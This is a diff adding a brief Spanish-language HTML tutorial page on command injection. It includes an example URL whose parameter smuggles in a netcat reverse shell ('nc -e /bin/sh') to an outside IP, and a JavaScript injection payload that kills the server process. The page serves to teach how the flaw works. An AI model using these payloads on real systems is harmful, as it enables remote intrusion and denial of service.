@@ -1,0 +1,16 @@
+<h1 id="10-command-injection">1.0 Command injection</h1>
+<hr />
+
+<p>Si la aplicacion ejecuta comandos de sistema en funcion del input de usuario y este no esta sanitizado, se pueden correr comandos en el servidor
+  ej:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  https://vulnerable.io/test.php?id=1 &amp;&amp; nc -e /bin/sh 130.10.10.16 4444
+
+</code></pre></div></div>
+
+<p>en javascript si usas
+  eval(), setTimeout(), setInterval(), Function() tmb se puede hacer injeccion de js</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  process.kill(process.pid)
+
+</code></pre></div></div>
